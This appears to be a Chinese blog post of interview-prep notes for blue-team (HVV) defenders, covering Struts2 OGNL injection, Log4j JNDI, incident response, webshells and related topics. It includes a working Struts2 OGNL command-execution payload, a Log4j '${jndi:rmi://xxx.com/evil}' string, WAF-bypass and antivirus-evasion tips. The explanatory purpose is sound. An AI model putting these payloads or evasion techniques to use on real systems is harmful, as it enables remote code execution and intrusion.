+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">redirect:$&#123;<span class="hljs-selector-id">#context</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;xwork.MethodAccessor.denyMethodExecution&#x27;</span>]</span>=false,#f=#_memberAccess<span class="hljs-selector-class">.getClass</span>()<span class="hljs-selector-class">.getDeclaredField</span>(<span class="hljs-string">&#x27;allowStaticMethodAccess&#x27;</span>),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.setAccessible</span>(true),<span class="hljs-selector-id">#f</span><span class="hljs-selector-class">.set</span>(#_memberAccess,true),@org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.io</span>.IOUtils@toString(@java<span class="hljs-selector-class">.lang</span>.Runtime@getRuntime()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&#x27;echo has vul&#x27;</span>)<span class="hljs-selector-class">.getInputStream</span>())&#125;<br></code></pre></td></tr></table></figure>
+
+<p>一个恶意的Struts2 URL，其中利用了OGNL表达式注入漏洞，通过设置xwork.MethodAccessor.denyMethodExecution为false，允许执行任意方法，然后利用反射机制修改_memberAccess对象的allowStaticMethodAccess属性，使其允许访问静态方法，最后调用java.lang.Runtime类的exec方法执行命令”echo has vul”，并将输出结果转换为字符串返回。</p>
+<p>为了避免这种漏洞，建议在使用Struts2时，对输入进行严格的验证和过滤，避免将用户输入作为OGNL表达式直接传递给DefaultActionMapper类</p>
+<h2 id="045"><a href="#045" class="headerlink" title="045"></a>045</h2><p>045漏洞是指Apache Struts框架中的一个漏洞，其成因是在接受content type值时，未能正确地验证和过滤用户输入，导致攻击者可以通过构造恶意的OGNL表达式，实现远程代码执行。其中，OGNL是一种表达式语言，用于在Java应用程序中访问和操作对象的属性和方法。</p>
+<p>攻击者可以通过在HTTP请求中添加恶意的payload，其中包含OGNL语法和member access字段，来触发漏洞。一旦漏洞被利用成功，攻击者可以在受影响的服务器上执行任意代码，从而控制服务器或窃取敏感信息。</p>
+<ul>
+<li>memberaccess是OGNL表达式中的一个关键字，用于控制OGNL表达式对Java对象的访问权限。在OGNL表达式中，memberaccess字段可以设置为”true”或”false”，分别表示允许或禁止访问Java对象的私有成员变量和方法。</li>
+<li>在045漏洞中，攻击者可以通过在HTTP请求中添加恶意的payload，其中包含memberaccess字段，来控制OGNL表达式对Java对象的访问权限，从而实现远程代码执行。具体来说，攻击者可以将memberaccess字段设置为”true”，以允许访问Java对象的私有成员变量和方法，从而执行任意代码。</li>
+</ul>
+<p>为了检测和防止045漏洞的攻击，可以查看服务器的catalina.out日志文件，其中可能会记录有关攻击的相关信息，例如恶意请求的URL和payload等</p>
+<h1 id="log4j"><a href="#log4j" class="headerlink" title="log4j"></a>log4j</h1><blockquote>
+<p>log4j2框架下的lookup服务提供了{}字段解析功能，传进去的值会被直接解析，JNDI服务会请求远程服务来链接本地对象，这时候只用在｛}里面调用JNDI服务即可反弹shell到指定服务器</p>
+<p>特征:数据包里有{jndi:ladp//}字段</p>
+</blockquote>
+<p><strong>在前端页面上输入了：${jndi:rmi://xxx.com:8080/evil} 这串字符， 然后后台用log4j记录了这串字符， log4j会自动使用jndi调用这个地址上的rmi内容</strong></p>
+<p>这个漏洞可以让攻击者通过向受影响的应用程序发送包含恶意JNDI（Java Naming and Directory Interface）引用的字符串来执行任意代码。这些字符串通常以${jndi:开头，后面跟着一个攻击者控制的服务器地址和一个可执行的命令。</p>
+<p> JNDI是Java命名和目录接口，它是一种提供命名和目录功能的API，可以让Java应用程序访问各种命名和目录服务</p>
+<p>RMI（Remote Method Invocation）是Java中的一种机制，用于实现远程过程调用（RPC）。它允许在不同的Java虚拟机（JVM）之间进行通信，并使得在一个JVM中的Java对象能够调用在另一个JVM中的Java对象的方法，就像在本地调用一样。RMI是Java平台的一部分，提供了一种简单的方法来实现分布式应用程序。</p>
+<h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><p>1.收集客户机器信息以及样本，做好文件备份</p>
+<p>2.判断安全事件的类型，是系统层面的，如挖矿病毒、后门木马，还是网络应用层面的，如webshell，或者是网络层面，如断网、DDOS等</p>
+<p>3.隔离机器</p>
+<p>4.日志、用户、进程、启动项、样本，看到可疑的就杀掉，删文件，打补丁，溯源</p>
+<p>5.产出一份安全事件报告</p>
+<ul>
+<li>将类似%WINDIR%System32目录进行时间顺序排查</li>
+<li>查看网络、端口：netstat -ano、ps -ef、netstat -antlp</li>
+<li>查看登录用户：who</li>
+<li>查看账户、用户信息：cat /etc/passwd /etc/shadow /etc/group</li>
+<li>lastlog # 最近登录日志</li>
+<li>crontal -l查看计划任务</li>
+<li>top查看CPU利用</li>
+<li>history查看历史命令</li>
+</ul>
+<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><p><strong>如何向服务器写入webshell</strong></p>
+<p>以下是一些可能被攻击者利用的 WebShell 写入方式：</p>
+<ol>
+<li>文件上传漏洞：如果 Web 应用程序存在上传文件的功能，而上传文件未经过严格的验证和过滤，那么攻击者可以上传带有 WebShell 的文件到服务器。</li>
+<li>SQL 注入：如果 Web 应用程序存在 SQL 注入漏洞，攻击者可以通过注入的方式执行系统命令或写入 WebShell 到服务器上。</li>
+</ol>
+<p><strong>/<em>!</em>/为什么能绕过waf</strong></p>
+<ul>
+<li>“/<em>!</em>/“ 可以使 WAF 无法直接识别出语句中包含了 “UNION SELECT” 关键字，从而绕过简单的 SQL 注入规则检测。</li>
+</ul>
+<p>拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</p>
+<blockquote>
+<p>.htaccess 是 Apache Web 服务器配置文件的一种，用于为特定目录下的网站配置属性、权限、重定向、错误处理等规则</p>
+</blockquote>
+<ul>
+<li>隐藏 WebShell：攻击者可能会修改 .htaccess 文件，将 WebShell 的访问权限限制只允许特定的 IP 地址或域名访问，防止其它人通过公网访问到该 Shell。</li>
+<li>重定向攻击：攻击者可能会通过修改 .htaccess 文件来进行重定向攻击，将用户请求重定向到恶意的网站或页面上，以窃取用户信息或传播恶意软件。</li>
+</ul>
+<p>判断出网站的CMS（内容管理系统）对渗透测试有很大的意义，因为不同的CMS可能存在不同的安全漏洞和攻击面，攻击者可以利用这些漏洞来实施攻击</p>
+<p>3389(远程连接)无法连接的几种情况</p>
+<ul>
+<li>防火墙阻止连接</li>
+<li>网络连接问题</li>
+<li>端口被占用</li>
+<li>远程桌面服务未启用</li>
+</ul>
+<p>渗透测试如何判断目标操作系统</p>
+<ul>
+<li>操作系统指纹识别工具</li>
+<li>ping的TTL值</li>
+<li>漏洞扫描工具（如OpenVAS、Nessus等）可以扫描目标主机上已知的漏洞，并根据漏洞类型和影响范围来推断目标操作系统。例如，如果漏洞扫描工具检测到目标主机上存在MS17-010漏洞，则可以推断目标操作系统为Windows</li>
+<li>如果Web应用程序返回的HTTP响应头中包含“Server: Apache/2.4.7 (Ubuntu)”信息，则可以推断目标操作系统为Ubuntu Linux</li>
+</ul>
+<p>蚁剑/菜刀/C刀/冰蝎的相同与不相同之处</p>
+<ul>
+<li>蚁剑/菜刀/C刀/冰蝎都是一些常用的WebShell管理工具，它们可以帮助攻击者在控制了网站后进行文件操作、命令执行、数据库管理等操作</li>
+<li>相同之处是都需要在目标网站上植入一句话木马，然后通过客户端与之通信，发送加密或编码后的数据包，执行相应的功能</li>
+<li>不同之处主要在于加密或编码方式、流量特征、功能模块等方面<ul>
+<li>菜刀是最早的WebShell管理工具，它使用Base64编码和eval函数来加密和执行数据包，流量特征为@eval和base64_decode。</li>
+<li>功能模块包括文件管理、虚拟终端、数据库管理等</li>
+</ul>
+</li>
+<li>蚁剑是一款开源的跨平台WebShell管理工具，它支持多种编码器和加密器，可以自定义数据包格式，流量特征较难被检测</li>
+<li>冰蝎是一款动态二进制加密的WebShell管理工具，它使用AES加密算法和openssl函数来加密和解密数据包，流量特征为openssl_decrypt。它的功能模块包括文件管理、虚拟终端、数据库管理、Socks代理、反弹shell等</li>
+</ul>
+<p>Windows常用的提权方法</p>
+<ul>
+<li>弱口令或漏洞进行提权，如数据库服务、Web服务、远程桌面服务</li>
+</ul>
+<p>正向代理和反向代理的区别</p>
+<ul>
+<li>正向代理是代理客户端，为客户端收发请求，使真实客户端对服务器不可见（VPN：local-》proxy-》Google）</li>
+<li>反向代理代理服务端，用户并不知道服务端是哪个发来的（拨打10086，10086就是反向代理，我们不知道客服是谁）</li>
+</ul>
+<p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202305052226209.png" srcset="/img/loading.gif" lazyload></p>
+<p>鱼叉攻击是一种针对特定目标的网络攻击，攻击者通过伪装成可信的发送者，向目标发送钓鱼邮件或信息，诱骗目标点击恶意链接或下载恶意附件，从而获取目标的敏感信息或控制目标的计算机</p>
+<p>水坑攻击是一种通过植入恶意代码或篡改网站等方式，诱骗目标访问恶意网站或下载恶意软件，从而获取目标的敏感信息或控制目标的计算机</p>
+<p>木马免杀</p>
+<ul>
+<li><p>在metasploit框架下免杀的方式之一是msf编码器，功能是使用msf编码器对我们制作的木马进行重新编码，生成一个二进制文件，这个文件运行后，msf编码器会将原始程序解码到内存中并执行。</p>
+</li>
+<li><p>upx file，对file文件进行加壳处理</p>
+</li>
+</ul>
+<p>如何验证是否存在CDN：nslookup命令</p>
+<h1 id="Weblogic-XMLDecoder-反序列化漏洞（CVE-2017-10271）"><a href="#Weblogic-XMLDecoder-反序列化漏洞（CVE-2017-10271）" class="headerlink" title="Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）"></a>Weblogic XMLDecoder 反序列化漏洞（CVE-2017-10271）</h1><blockquote>
+<p>WLS：weblogic server,wls组件对外提供webserver服务</p>
+</blockquote>
+<p>触发方式：访问ip:port/wls-wsat/CoordinatorPortType，抓包，使用POST传递参数</p>
+<p>原理：Weblogic“wls-wsat”组件在反序列化操作时使用了<strong>XMLDecoder</strong>类进行XML反序列化操作引发了代码执行</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8465">https://xz.aliyun.com/t/8465</a></p>
+<h1 id="常见代码执行、文件读取、命令执行的函数"><a href="#常见代码执行、文件读取、命令执行的函数" class="headerlink" title="常见代码执行、文件读取、命令执行的函数"></a>常见代码执行、文件读取、命令执行的函数</h1><ol>
+<li>代码执行函数：eval()、Function()、setTimeout()、setInterval()、new Function()等。</li>
+<li>文件读取函数：file_get_contents()、fopen()、readfile()、file()、fgets()等。</li>
+<li>命令执行函数：exec()、system()、passthru()、shell_exec()、popen()等。</li>
+</ol>
+<h1 id="有用的github项目"><a href="#有用的github项目" class="headerlink" title="有用的github项目"></a>有用的github项目</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.revshells.com/">Online - Reverse Shell Generator</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings">GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF</a></li>
+<li>应急响应实战笔记 <a target="_blank" rel="noopener" href="https://github.com/Bypass007/Emergency-Response-Notes">GitHub - Bypass007/Emergency-Response-Notes: 应急响应实战笔记，一个安全工程师的自我修养。</a></li>
+</ul>
+<h1 id="一些文章"><a href="#一些文章" class="headerlink" title="一些文章"></a>一些文章</h1><p><a target="_blank" rel="noopener" href="https://www.wangan.com/p/7fy78403bdf27404">蓝队面试题整理（防守方面试题整理） - 网安</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.tlcement.com/27237.html">2022年蓝队初级护网面试题总结-网络知识</a></p>
+<p> <a target="_blank" rel="noopener" href="https://javasec.org/">攻击Java Web应用-[Java Web安全]</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.tlcement.com/27237.html">2022年蓝队初级护网面试题总结-网络知识</a></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://websec.readthedocs.io/zh/latest/index.html">Web安全学习笔记 — Web安全学习笔记 1.0 文档</a><ul>
+<li>内网渗透章节</li>
+</ul>
+</li>
+</ul>
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>hvv面试知识点扫盲</div>
+      <div>http://gls.show/p/e32f19d0/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>郭佳明</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年7月26日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/p/cc09e53b/" title="LaTeX快速入门">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">LaTeX快速入门</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/p/135735d/" title="SEED-lab：Public-Key Infrastructure (PKI) Lab">
+                        <span class="hidden-mobile">SEED-lab：Public-Key Infrastructure (PKI) Lab</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'LaPhilosophie/gls.show');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> <script src="/js/cursor.js"></script>
+</div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      京ICP备2021035969号
+    </a>
+  </span>
+  
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.0/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        MathJax = {
+          tex    : {
+            inlineMath: { '[+]': [['$', '$']] }
+          },
+          loader : {
+            load: ['ui/lazy']
+          },
+          options: {
+            renderActions: {
+              findScript    : [10, doc => {
+                document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                  const display = !!node.type.match(/; *mode=display/);
+                  const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                  const text = document.createTextNode('');
+                  node.parentNode.replaceChild(text, node);
+                  math.start = { node: text, delim: '', n: 0 };
+                  math.end = { node: text, delim: '', n: 0 };
+                  doc.math.push(math);
+                });
+              }, '', false],
+              insertedScript: [200, () => {
+                document.querySelectorAll('mjx-container').forEach(node => {
+                  let target = node.parentNode;
+                  if (target.nodeName.toLowerCase() === 'li') {
+                    target.parentNode.classList.add('has-jax');
+                  }
+                });
+              }, '', false]
+            }
+          }
+        };
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.0/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/caidai.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
